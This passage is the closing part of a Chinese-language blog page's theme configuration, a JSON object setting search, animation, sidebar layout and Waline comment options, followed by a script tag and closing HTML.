毫秒）","placeholder":"搜索..."},"lang":"zh-CN","lazyload":false,"localSearch":{"enable":true,"limit":1e3,"path":"/searchindexes.xml","preload":false,"topnperarticle":-1,"trigger":"auto","unescape":false},"motion":{"async":true,"enable":true,"transition":{"collheader":"fadeInLeft","postblock":"fadeIn","postbody":"fadeInDown","postheader":"fadeInDown","sidebar":"fadeInUp"}},"postmeta":{"comments":{"enable":true,"plugin":"waline"},"views":{"enable":true,"plugin":"busuanzi"}},"root":"/","scheme":"Gemini","sidebar":{"display":"post","offset":12,"padding":18,"position":"left","width":256},"vendor":{"plugins":"local","router":{"name":"local","type":"modern","url":"https://zp9080.github.io/3rd"}},"version":"4.6.3","waline":{"cfg":{"emoji":false,"imguploader":false,"placeholder":"请文明发言哟 ヾ(≧▽≦*)o","reaction":true,"reactiontext":["点赞","踩一下","得意","不屑","尴尬","睡觉"],"reactiontitle":"你认为这篇文章怎么样？","requiredmeta":["nick","mail"],"serverurl":null,"sofa":"快来发表你的意见吧 (≧∀≦)ゞ","wordlimit":200},"css":{"alias":"@waline/client","file":"dist/waline.css","name":"waline","version":"2.15.8"},"js":{"alias":"@waline/client","file":"dist/waline.js","name":"waline","version":"2.15.8"}}}</script><script type=text/javascript src=/js/main.min.befa9b7d22ec90da86c74c5dbff5ee42c12e9fc6d6f4448bfcc596cc329b19e8.js defer></script></body></html>